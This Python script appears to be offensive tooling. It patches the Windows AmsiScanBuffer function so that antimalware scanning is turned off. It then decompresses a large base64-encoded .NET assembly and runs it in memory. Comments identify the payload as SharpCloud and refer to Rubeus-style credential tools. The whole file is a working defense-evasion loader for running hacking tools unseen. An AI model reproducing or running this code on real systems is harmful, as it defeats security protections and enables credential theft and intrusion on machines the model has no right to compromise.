import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpCloud.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()